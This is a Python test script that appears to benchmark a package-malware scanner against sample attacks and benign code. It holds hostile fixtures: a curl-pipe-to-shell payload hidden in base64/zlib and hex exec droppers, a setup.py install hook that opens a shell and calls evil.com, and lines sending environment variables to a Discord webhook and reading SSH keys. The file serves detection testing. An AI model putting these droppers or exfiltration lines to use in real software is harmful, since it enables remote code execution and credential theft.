"""Phase 4 Reality Verification Benchmark (offline except the optional deps.dev check)."""
from __future__ import annotations
import base64, os, sys, textwrap, zlib
sys.path.insert(0, os.path.dirname(__file__))

from malware_proof import scan_ast_deobfuscation, scan_static_setup_py
from repo_behavior import scan_behavior

_results = []
def _url_fn(f, ln): return f"test://{f}#L{ln}"

def _record(name, passed, detail=""):
    _results.append(passed)
    print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
    for line in (detail or "").strip().splitlines():
        print(f"           {line}")

PAYLOAD = 'import os; os.system("curl http://198.51.100.42/sh | sh")'

def test_attack1_double_encoded_dropper():
    enc = base64.b64encode(zlib.compress(PAYLOAD.encode())).decode()
    mid = len(enc) // 2
    code = textwrap.dedent(f'''\
        import base64, zlib
        payload = ("{enc[:mid]}""{enc[mid:]}")
        exec(zlib.decompress(base64.b64decode(payload)).decode())
    ''')
    r = scan_ast_deobfuscation({"evil.py": code}, _url_fn)
    _record("Attack 1: base64+zlib dropper via variable", any(f["strong"] for f in r["findings"]))

def test_attack2_hex_exec():
    code = f'exec(bytes.fromhex("{PAYLOAD.encode().hex()}"))\n'
    r = scan_ast_deobfuscation({"evil2.py": code}, _url_fn)
    _record("Attack 2: exec(bytes.fromhex(...))", any(f["strong"] for f in r["findings"]))

def test_attack3_setup_exec_net():
    code = textwrap.dedent('''\
        import subprocess, urllib.request
        from setuptools import setup, Command
        class Evil(Command):
            def run(self):
                subprocess.Popen(["/bin/sh"])
                urllib.request.urlopen("http://evil.com")
        setup(cmdclass={'install': Evil})
    ''')
    r = scan_static_setup_py({"setup.py": code}, _url_fn)
    _record("Attack 3: setup.py exec + network", any(f["strong"] for f in r["findings"]))

def test_attack4_behavior_fixture():
    fx = ('exec(base64.b64decode("cHJpbnQoJ2hpJyk="))\n'
          'requests.post("https://discord.com/api/webhooks/123456789/abcdef", data=dict(os.environ))\n'
          'open(os.path.expanduser("~/.ssh/id_rsa"))\n')
    r = scan_behavior({"text": {"behavior_fixture.txt": fx}, "binaries": []}, "demo", _url_fn)
    pats = set(r["profile"]["patterns"])
    _record("Attack 4: credential-stealer + dropper patterns",
            {"Credential-stealer pattern", "Dropper / loader pattern"} <= pats, f"patterns: {sorted(pats)}")

def test_benign_setup_versions_and_env():
    code = textwrap.dedent('''\
        import os, subprocess
        from setuptools import setup
        v = subprocess.check_output(["git", "describe"]).decode().strip()
        token = os.environ.get("X"); cfg = {}.get("a")
        setup(name="t", version=v)
    ''')
    r = scan_static_setup_py({"setup.py": code}, _url_fn)
    _record("Benign: git describe + .get() in setup.py", not any(f["strong"] for f in r["findings"]))

def test_benign_wait_for_it():
    sh = "(echo > /dev/tcp/$HOST/$PORT) >/dev/null 2>&1\n"
    r = scan_behavior({"text": {"wait-for-it.sh": sh}, "binaries": []}, "demo", _url_fn)
    _record("Benign: /dev/tcp port check", not any(f["strong"] for f in r["findings"]))

def test_benign_regex_literal():
    r = scan_ast_deobfuscation({"f.py": 'import re\nre.compile(r"(?:urllib|requests\\.get|os\\.environ)")\n'}, _url_fn)
    _record("Benign: regex mentioning requests/os.environ", not r["findings"])

def test_typosquat():
    from blast_radius import check_typosquat
    ok = check_typosquat("reqeusts") == "requests" and check_typosquat("reach") is None
    _record("Typosquat table (offline)", ok)

def main():
    print("=" * 72 + "\n  Phase 4 Reality Verification\n" + "=" * 72)
    for t in (test_attack1_double_encoded_dropper, test_attack2_hex_exec, test_attack3_setup_exec_net,
              test_attack4_behavior_fixture, test_benign_setup_versions_and_env, test_benign_wait_for_it,
              test_benign_regex_literal, test_typosquat):
        try:
            t()
        except Exception as e:
            _record(t.__name__, False, f"raised {type(e).__name__}: {e}")
    print(f"\n{sum(_results)}/{len(_results)} passed")
    sys.exit(0 if all(_results) else 1)

if __name__ == "__main__":
    main()